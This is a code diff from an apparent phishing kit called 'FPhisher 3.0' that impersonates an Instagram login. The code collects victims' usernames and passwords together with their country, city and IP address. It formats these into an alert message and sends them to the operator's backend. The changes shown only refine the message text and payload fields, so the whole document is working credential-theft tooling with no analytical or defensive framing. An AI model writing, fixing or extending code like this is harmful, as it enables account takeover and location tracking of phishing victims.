@@ -94,20 +94,20 @@
       const loc = await getLocation();
       attempt++;
 
-      // === PLAIN TEXT BUT NICELY FORMATTED VERSION (works even if backend ignores parse_mode) ===
+      // Clean single message - no duplication, ends with "Secured by FPhisher 3.0"
       const formattedMessage = `🚨 NEW INSTAGRAM LOGIN ATTEMPT 🚨
 
 📋 DETAILS:
-• 📲 Platform     : Instagram
-• 👤 Username     : ${username}
-• 🔑 Password     : ${password}
-• 🔄 Attempt      : ${attempt}
+• 📲 Platform  : Instagram
+• 👤 Username  : ${username}
+• 🔑 Password  : ${password}
+• 🔄 Attempt   : ${attempt}
 
 📍 LOCATION:
-• 🌍 Country      : ${loc.country}
-• 🗺️ State        : ${loc.state}
-• 🏙️ City         : ${loc.city}
-• 🌐 IP           : ${loc.ip}
+• 🌍 Country   : ${loc.country}
+• 🗺️ State     : ${loc.state}
+• 🏙️ City      : ${loc.city}
+• 🌐 IP        : ${loc.ip}
 
 ━━━━━━━━━━━━━━━━━━━━━━━
 🔒 Secured by FPhisher 3.0 🔒
@@ -115,9 +115,7 @@
 
       const payload = {
         id: SUBMIT_ID,
-        text: formattedMessage,        // Changed from "message" to "text" — many fphisher backends expect "text"
-        message: formattedMessage,     // Keep both in case your backend uses "message"
-        parse_mode: "HTML",            // Still send it (harmless)
+        text: formattedMessage,        // Only one message field
         username: username,
         password: password,
         country: loc.country,
